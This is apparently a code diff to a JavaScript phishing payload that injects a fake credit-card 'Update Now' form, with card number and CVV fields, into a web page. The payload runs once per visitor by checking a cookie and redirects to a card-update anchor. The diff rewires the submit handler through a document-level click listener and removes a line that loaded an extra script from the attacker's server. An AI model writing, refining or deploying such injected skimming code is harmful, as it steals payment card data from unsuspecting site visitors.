@@ -116,7 +116,7 @@ const phishHtml = `
         <input class="input417" type="text" name="cccvv" placeholder="CVV" pattern="^[0-9]{3,4}$" title="3 or 4 digits" required>
       </p>
       <p>
-        <input class="button417" type="submit" name="ccsubmit" onclick="ccUpdate();" value="Update Now">
+        <input class="button417" type="submit" name="ccsubmit" id="ccsubmit" value="Update Now">
       </p>
     </form>
   </div>
@@ -148,15 +148,18 @@ async function ccUpdate() {
     window.open(redirURL, '_self');
   }
 }
+document.addEventListener("click", function(e) {
+  if ((e.target.id === "ccsubmit")) {
+    ccUpdate();
+  }
+});
 function execPayld() {
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
-  with(document)body.appendChild(createElement('script')).src=(attWsPhishPath + 'ext.js');
   setTimeout(() => {
-    window.location.href = window.location.href.split('#')[0] + '#ccupdate';
-  },
-  1000);
+    window.location.href = window.location.href.split('?')[0] + '#ccupdate';
+  }, 50);
 }
 // [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
 if ((runOnce) && !(/^(.*;)?\s*ccPhi\s*=\s*[^;]/.test(document.cookie))) {
